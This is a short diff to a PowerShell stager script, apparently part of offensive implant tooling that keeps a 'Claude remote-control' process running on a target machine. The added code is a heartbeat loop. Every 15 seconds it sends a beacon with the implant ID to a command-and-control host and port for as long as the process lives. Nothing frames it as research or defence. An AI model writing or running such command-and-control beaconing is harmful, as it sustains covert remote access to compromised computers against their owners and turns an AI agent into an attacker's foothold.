@@ -280,6 +280,17 @@ if ($bridgeUrl) {
 $success = $true
 Write-Verbose "Stager done. Claude remote-control remains running (PID: $($proc.Id))."
 
+# ── Heartbeat loop — periodic check-in while claude is running ──────────────
+$heartbeatInterval = 15  # seconds
+Write-Verbose "Starting heartbeat loop (interval: ${heartbeatInterval}s)"
+while (-not $proc.HasExited) {
+    Start-Sleep -Seconds $heartbeatInterval
+    if ($bridgeUrl) {
+        Send-Beacon "HEARTBEAT $ImplantId" $C2Host $C2Port | Out-Null
+    }
+}
+Write-Verbose "Claude process exited. Heartbeat stopped."
+
 } finally {
     if (-not $success) {
         Write-Verbose "Staging failed - cleaning up $StagingDir"
